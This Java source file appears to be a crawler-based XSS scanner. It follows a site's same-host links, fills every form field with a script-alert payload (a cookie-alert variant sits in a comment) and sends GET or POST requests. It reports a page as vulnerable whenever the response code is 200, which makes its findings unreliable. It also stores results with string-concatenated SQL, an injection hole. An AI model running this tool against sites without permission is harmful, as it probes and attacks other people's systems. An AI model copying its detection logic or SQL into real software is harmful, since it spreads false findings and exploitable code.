import java.io.DataOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.sql.Connection;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import javax.net.ssl.HttpsURLConnection;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

public class App {

	private long THREAD_ASLEEP = 1000;
	private int SECONDS_AWAIT = 5;
	private String ATTACK_STR_PARAM = "=<script>alert('in')</script>&"; //<img src=x onerror="alert(document.cookie);
	private final String USER_AGENT = "Mozilla/5.0";
	private List<String> visited_links;
	private LinkedList<URL> urls;
	private ExecutorService executor;
	
	public App(int threads) {
		visited_links = new ArrayList<String>();
		urls = new LinkedList<URL>();
		if(threads > 0){
			executor = Executors.newFixedThreadPool(threads);
		}
	}

	public static void main(String[] args) {
		try {
			String str_url = args[0];
			URL url = new URL(str_url.toString());
			
			int threads = Integer.valueOf(args[1]);
			App app = new App(threads);
			app.startCheck(url);
			
		} catch (MalformedURLException e) {
			System.out.println("Something went wrong... " + e.getMessage());
		}		
	}

	public void extractData(URL url){ 
		String attr = "";
		try {
			Document doc = Jsoup.connect(url.toString()).get();
			Elements inputs = null;
			Elements texts = null;
			Elements forms = doc.select("form");
			Form form = null;
			List<Form> formList = new LinkedList<Form>();
			for(Element f : forms){
				form = new Form(f.attr("method"));
				inputs = f.select("input[name]");
				texts = f.select("textarea[name]");
				for(Element input : inputs){
					attr = input.attr("name");
					form.addInput(attr);
				}
				for(Element text : texts){
					attr = text.attr("name");
					form.addInput(attr);
				}
				formList.add(form);
			}
			if(attack(url.toString(), formList)){
				System.out.println("Result - ");
				System.out.println("The URL: "+ url.toString() +" is XSS vulnerable!");
			}
			
			Elements links = doc.select("a[href]"); 
			for (Element link : links) { 
				attr = link.attr("abs:href");
				if(attr.indexOf(url.getHost()) != -1){
					//startCheck(new URL(attr));
					addURL(new URL(attr));
				}
			} 
			
		} catch (IOException e) {
			System.out.println("Something went wrong... " + e.getMessage());
		} 
	}
	
	private void startCheck(URL init) {
		urls.addLast(init);
		while(!executor.isShutdown()){
				Runnable r_url = new Runnable(){
				     public void run(){
				    	URL url = removeURL();
						if(!visited(url.toString())){
					        System.out.println("Running: " + url);
					        extractData(url);
					        try {
								Thread.sleep(THREAD_ASLEEP);
							} catch (InterruptedException e) {
								System.out.println("Something went wrong while sleeping: " + e.getMessage());
							}
						}
				     }
				   };
		
				   
				   executor.submit(r_url);
				   synchronized(urls){
					   if(urls.isEmpty()){
						   executor.shutdown();
					   }
				   }
				   
				   try {
						executor.awaitTermination(SECONDS_AWAIT, TimeUnit.SECONDS);
					} catch (InterruptedException e) {
						System.out.println("Something went wrong while waiting: " + e.getMessage());
					}
			    //System.out.println("Finished all threads");
		}
	}

	private synchronized boolean visited(String url){
		if(visited_links.contains(url)){
			return true;
		}
		visited_links.add(url);
		return false;
	}
	
	private synchronized void addURL(URL url){
		if(!urls.contains(url)){
			urls.addLast(url);
		}
	}
	
	private synchronized URL removeURL(){
		return urls.removeFirst();
	}
	
	public boolean attack(String url, List<Form> forms){
		String urlParameters = "";
		boolean vuln_found = false;
		for(Form form : forms){
			urlParameters = "";
			for (String p : form.inputs) {
				urlParameters = urlParameters.concat(p.concat(ATTACK_STR_PARAM));
			}
			
			if(urlParameters != ""){
				urlParameters = urlParameters.substring(0, urlParameters.length()-1);
			}
			
			try {
				if(form.type.toUpperCase().equals("GET")){
					if(sendGet(url.concat("?"+urlParameters))){
						vuln_found = true;
						insertParams(url, form.inputs);
					}
				}else{
					if(sendPost(url, urlParameters)){
						vuln_found = true;
						insertParams(url, form.inputs);
					}
				}
				
			} catch (Exception e) {
				System.out.println("Something went wrong... " + e.getMessage());
			}
		}
		
		return vuln_found;
	}
	
	
	// HTTP GET request
		private boolean sendGet(String url) throws Exception {

			URL obj = new URL(url);
			HttpURLConnection con = (HttpURLConnection) obj.openConnection();

			// optional default is GET
			con.setRequestMethod("GET");

			//add request header
			con.setRequestProperty("User-Agent", USER_AGENT);

			int responseCode = con.getResponseCode();
			System.out.println("\nSending 'GET' request to URL : " + url);
			System.out.println("Response Code : " + responseCode);

			if(responseCode == 200){
				return true;
			}
			return false;
		}

		// HTTP POST request
		private boolean sendPost(String url, String urlParameters) throws Exception {

			URL obj = new URL(url);
			HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();

			//add reuqest header
			con.setRequestMethod("POST");
			con.setRequestProperty("User-Agent", USER_AGENT);
			con.setRequestProperty("Content-Language", "en-US");
			
			// Send post request
			con.setDoOutput(true);
			DataOutputStream wr = new DataOutputStream(con.getOutputStream());
			wr.writeBytes(urlParameters);
			wr.flush();
			wr.close();

			int responseCode = con.getResponseCode();
			System.out.println("\nSending 'POST' request to URL : " + url);
			System.out.println("Post parameters : " + urlParameters);
			System.out.println("Response Code : " + responseCode);

			if(responseCode == 200){
				return true;
			}
			return false;
		}
		
		private void insertParams(String url, List<String> params) {
			Connection connection = JDBCMySQLConnection.getConnection();
			
			try {			
				connection = JDBCMySQLConnection.getConnection();
				Statement st = (Statement) connection.createStatement(); 

				String str_params = "";
				for(String param : params){
					str_params = str_params.concat(param).concat(";");
				}
				if(str_params.length() > 0){
					str_params = str_params.substring(0, str_params.length()-1);
				}
				String exe  = "INSERT INTO attacks (url, params) " + "VALUES (\""+ url + "\",\""+ str_params+"\");";
			     st.executeUpdate(exe);

			     connection.close();

			} catch (SQLException e) {
				e.printStackTrace();
			} finally {
				if (connection != null) {
					try {
						connection.close();
					} catch (SQLException e) {
						System.out.println("Something went wrong... " + e.getMessage());
					}
				}
			}
		}
}
